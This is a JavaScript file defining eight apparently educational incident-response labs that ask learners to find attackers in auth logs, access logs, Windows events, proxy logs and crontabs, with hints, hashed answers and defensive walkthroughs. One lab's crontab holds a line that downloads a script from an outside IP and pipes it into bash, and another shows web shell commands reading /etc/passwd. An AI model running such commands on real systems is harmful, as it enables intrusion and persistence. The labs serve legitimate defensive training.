/* HackGrid labs · Logs & incident response (generated from _shared/tools/labs-src, do not edit the built copy) */
(function () {
const L = o => HR.defineLab(Object.assign({ env: { type: 'static', blocks: o.blocks || [] } }, o));

L({ id: 'logs-01', cat: 'logs', diff: 1, title: 'Knock Knock',
  brief: `Monday morning, the SSH server's auth log is much longer than usual. Find the address that is hammering the login.`,
  blocks: [{ t: 'code', title: '/var/log/auth.log (excerpt)', text: 'Nov  3 02:11:04 web01 sshd[2211]: Failed password for root from 203.0.113.45 port 40122 ssh2\nNov  3 02:11:06 web01 sshd[2213]: Failed password for root from 203.0.113.45 port 40130 ssh2\nNov  3 02:11:07 web01 sshd[2215]: Failed password for invalid user admin from 203.0.113.45 port 40136 ssh2\nNov  3 02:11:09 web01 sshd[2217]: Failed password for invalid user oracle from 203.0.113.45 port 40144 ssh2\nNov  3 08:02:51 web01 sshd[3120]: Accepted publickey for alice from 10.0.0.15 port 51024 ssh2\nNov  3 02:11:10 web01 sshd[2219]: Failed password for invalid user test from 203.0.113.45 port 40150 ssh2\n... 1,412 more lines like these ...' }],
  q: 'Which IP address is brute-forcing SSH?', ph: 'x.x.x.x',
  accept: ["eb4b2dd34d5ba9aff5f39480c21f10aff75f58d1bfe56c0d153cb60b63533992"],
  hints: [`Look at the Failed password lines.`, `One source address appears again and again, every second or two.`, `alice's login from 10.0.0.15 used a key and succeeded: that is normal.`],
  walk: `<b>203.0.113.45</b> tries root, admin, oracle, test: a password-guessing bot. In real life you would count with <span class="mono">grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn</span>. Defenses: key-only SSH, no root login, and a tool like fail2ban.` });

L({ id: 'logs-02', cat: 'logs', diff: 2, title: 'The One That Worked',
  brief: `Guessing is noisy. Success is quiet. After hundreds of failures, one line is different. Which account fell?`,
  blocks: [{ t: 'code', title: '/var/log/auth.log (excerpt)', text: 'Nov  4 23:40:12 web01 sshd[8811]: Failed password for deploy from 198.51.100.23 port 33410 ssh2\nNov  4 23:40:13 web01 sshd[8813]: Failed password for deploy from 198.51.100.23 port 33414 ssh2\nNov  4 23:40:15 web01 sshd[8815]: Failed password for backup from 198.51.100.23 port 33420 ssh2\nNov  4 23:40:16 web01 sshd[8817]: Failed password for deploy from 198.51.100.23 port 33426 ssh2\nNov  4 23:40:18 web01 sshd[8819]: Accepted password for deploy from 198.51.100.23 port 33430 ssh2\nNov  4 23:40:18 web01 sshd[8819]: pam_unix(sshd:session): session opened for user deploy by (uid=0)\nNov  4 23:41:02 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id' }],
  q: 'Which account was compromised?', ph: 'username',
  accept: ["b7bd55c11b781b0ccc43aa6e57f9dadf0660e9d1d4e27e0979ee43a407d454ae"],
  hints: [`Look for Accepted instead of Failed.`, `Same source IP as all the failures.`, `And then that account immediately tried sudo.`],
  walk: `<b>deploy</b>: after repeated failures from 198.51.100.23, <span class="mono">Accepted password for deploy</span>, followed within a minute by a sudo attempt. That pattern (many failures, one success, immediate privilege checks) is the signature of a successful brute force. Response: lock the account, kill its sessions, rotate credentials, and review everything deploy did after 23:40:18.` });

L({ id: 'logs-03', cat: 'logs', diff: 2, title: 'Robots in the Access Log',
  brief: `The web server's access log shows a burst of strange requests. One client is running an automated vulnerability scanner. Find it.`,
  blocks: [{ t: 'code', title: 'access.log (excerpt)', text: '10.0.0.15 - - [05/Nov/2026:10:01:12] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/131.0"\n198.51.100.77 - - [05/Nov/2026:10:02:01] "GET /phpinfo.php HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000132)"\n198.51.100.77 - - [05/Nov/2026:10:02:01] "GET /.git/HEAD HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000415)"\n203.0.113.200 - - [05/Nov/2026:10:02:03] "GET /products?id=12 HTTP/1.1" 200 2210 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) Safari/605.1.15"\n198.51.100.77 - - [05/Nov/2026:10:02:02] "GET /admin/config.bak HTTP/1.1" 404 162 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000877)"' }],
  q: 'Which IP address is running the scanner?', ph: 'x.x.x.x',
  accept: ["3696668f6f827407e5ff469091d3da2449de15b914b45b1afe87aeb5436f3ecb"],
  hints: [`Read the user-agent strings at the end of each line.`, `Real browsers do not announce test numbers.`, `Many 404s on well-known sensitive paths in the same second.`],
  walk: `<b>198.51.100.77</b>: the user agent literally says <span class="mono">Nikto/2.5.0</span>, and it requests classic sensitive paths (phpinfo, .git, backups) at machine speed, all 404. Attackers can change user agents, so the behavior (many 404s on known paths, high rate) is the stronger signal for detection rules.` });

L({ id: 'logs-04', cat: 'logs', diff: 2, title: 'New Admin in Town',
  brief: `A Windows server's Security log, filtered to the interesting events. The attacker got in, then made sure they could come back. What account did they create?`,
  blocks: [{ t: 'table', title: 'Security events (filtered)', cols: ['Time', 'Event ID', 'Details'],
    rows: [['01:58:10', '4625', 'Logon failure: svc_backup from 203.0.113.12 (x34)'], ['02:03:44', '4624', 'Logon success: svc_backup, type 10 (RemoteInteractive) from 203.0.113.12'], ['02:05:01', '4720', 'User account created: helpdesk2, by svc_backup'], ['02:05:09', '4732', 'Member added to Administrators: helpdesk2, by svc_backup'], ['02:06:30', '4624', 'Logon success: helpdesk2, type 10 from 203.0.113.12'], ['08:30:00', '4624', 'Logon success: m.lee, type 2 (Interactive)']] }],
  q: 'Which account did the attacker create for persistence?', ph: 'account name',
  accept: ["713e72dc3a7336c42043c2f814a70e316486ecbde40f318e325b5337ff17ec31"],
  hints: [`4625 = failed logon, 4624 = success, 4720 = account created, 4732 = added to a security group.`, `Type 10 is RDP.`, `Who was created at 02:05, and which group did they join?`],
  walk: `<b>helpdesk2</b> was created (4720) by the compromised <span class="mono">svc_backup</span> and added to Administrators (4732), then used to log in over RDP. Memorize these IDs: 4624/4625 logons, 4720 new user, 4732/4728 group changes, 4688 process creation, 1102 log cleared. Service accounts with RDP and weak passwords are a classic entry point.` });

L({ id: 'logs-05', cat: 'logs', diff: 3, title: 'Build the Timeline',
  brief: `Logs from three sources, merged. Your incident report needs the time of the attacker's first successful action, the moment they actually got in.`,
  blocks: [{ t: 'code', title: 'merged timeline (UTC)', text: '21:58:02 waf      blocked  198.51.100.40  GET /wp-login.php\n22:03:15 web      404      198.51.100.40  GET /.env\n22:07:41 web      200      198.51.100.40  POST /api/login  user=jsmith  (after 212 failed attempts)\n22:07:44 app      session  jsmith  new session from 198.51.100.40\n22:09:10 app      export   jsmith  downloaded customers.csv (18,240 rows)\n22:15:02 mail     rule     jsmith  created inbox rule: forward *invoice* to ext address' }],
  q: 'At what time did the attacker first succeed? (HH:MM:SS)', ph: 'HH:MM:SS',
  accept: ["5b6d13ae40331b5de15331f30c5a90c165e1f225115fd5b567661fe809590159"],
  hints: [`Blocked and 404 entries are attempts, not success.`, `Find the first 200 that gave the attacker something.`, `The successful login came before the session line.`],
  walk: `<b>22:07:41</b>: the login POST returned 200 after 212 failures. Everything before was reconnaissance (blocked, 404); everything after is impact: session at 22:07:44, data export at 22:09:10, and a mail forwarding rule for persistence at 22:15:02. A clean timeline is the backbone of every incident report.` });

L({ id: 'logs-06', cat: 'logs', diff: 2, title: 'Heavy Upload',
  brief: `Proxy logs from the night of the incident. Most traffic is small. One transfer is not.`,
  blocks: [{ t: 'table', title: 'proxy.log (outbound)', cols: ['Time', 'Host', 'Method', 'Destination', 'Bytes out'],
    rows: [['02:58', 'FIN-PC-07', 'GET', 'updates.vendor.example', '1,204'], ['03:01', 'FIN-PC-07', 'GET', 'news.example', '3,880'], ['03:12', 'FIN-PC-07', 'POST', 'drop.filebin.example', '2,147,483,112'], ['03:14', 'HR-PC-02', 'GET', 'mail.corp.example', '9,912'], ['03:20', 'FIN-PC-07', 'GET', 'updates.vendor.example', '1,190']] }],
  q: 'Which domain received the exfiltrated data?', ph: 'domain',
  accept: ["f9c0165b4d86d5a89dd15d7083a623822b27e8be4dbbeb21ef07c00da44adc10", "39c9c275759659127e2a616fd9c3476808ba8763d3b4bdf7f6aae823424596ad"],
  hints: [`Exfiltration means data going OUT: look at bytes out.`, `Downloads use GET with small requests. Uploads use POST.`, `One row sent about 2 GB at 3 AM.`],
  walk: `<b>drop.filebin.example</b> received about 2 GB via POST from FIN-PC-07 at 03:12. Large outbound volume, at night, to a file-sharing service, from a finance machine: four red flags in one row. Data loss prevention tools alert on exactly this ratio of bytes out versus bytes in.` });

L({ id: 'logs-07', cat: 'logs', diff: 3, title: 'Every Five Minutes',
  brief: `The attacker was kicked out, but keeps coming back. You list the cron jobs on the server. One of them is persistence.`,
  blocks: [{ t: 'code', title: 'crontab -l (user www-data)', text: '# m h dom mon dow command\n0 3 * * *   /usr/bin/php /var/www/app/artisan schedule:run\n30 4 * * 0  /usr/local/bin/rotate-logs.sh\n*/5 * * * * curl -s http://198.51.100.9/u.sh | bash\n15 1 * * *  /usr/bin/find /tmp -mtime +7 -delete' }],
  q: 'From which IP does the persistence job download its script?', ph: 'x.x.x.x',
  accept: ["2ba3fdf22d357ae981aa678cb39463c2e073a62fbce05b8927055e8d3d1bbdf0"],
  hints: [`*/5 means every five minutes.`, `Downloading a script and piping it straight into bash is never normal for a web user.`, `The address is inside the curl URL.`],
  walk: `<span class="mono">*/5 * * * * curl -s http://<b>198.51.100.9</b>/u.sh | bash</span> re-downloads and runs code every five minutes, so killing processes alone never works. Remove the cron entry, block the IP, and find how www-data got write access to its crontab. Always check cron, systemd timers, shell rc files and SSH authorized_keys when hunting persistence.` });

L({ id: 'logs-08', cat: 'logs', diff: 3, title: 'The Avatar That Talks',
  brief: `An upload feature accepts profile pictures. The access log shows someone talking to a file in the uploads folder with commands. Find the web shell.`,
  blocks: [{ t: 'code', title: 'access.log (excerpt)', text: '203.0.113.88 "POST /profile/avatar HTTP/1.1" 200 "image upload ok: avatar_9921.php"\n203.0.113.88 "GET /uploads/avatar_9921.php?c=whoami HTTP/1.1" 200 9\n203.0.113.88 "GET /uploads/avatar_9921.php?c=uname%20-a HTTP/1.1" 200 88\n10.0.0.15   "GET /uploads/avatar_1043.png HTTP/1.1" 200 20441\n203.0.113.88 "GET /uploads/avatar_9921.php?c=cat%20/etc/passwd HTTP/1.1" 200 1840' }],
  q: 'What is the path of the web shell?', ph: '/path/to/file',
  accept: ["b58e403f8882ee521f81d66b3b360413b38d12a5b0f53a9e68bb2dc215ebf0ef", "494f18fe9d5589a3e42d90551290f183464dde7a14a5f6cf6430a52860ef5f2f", "ed336c0ff3a308e18faa7f3acc5e44a69e74d94d9ff7595c9d015a3659b7e49a"],
  hints: [`Images do not take command parameters.`, `Look at the file extension of the uploaded "image".`, `The c= parameter carries shell commands.`],
  walk: `<b>/uploads/avatar_9921.php</b>: the upload accepted a .php file, and requests with <span class="mono">?c=whoami</span> return command output. Two fixes: validate uploads by content and extension allowlist (and rename them), and never let the uploads folder execute scripts. Detection: any request to a script file inside an uploads directory.` });
})();
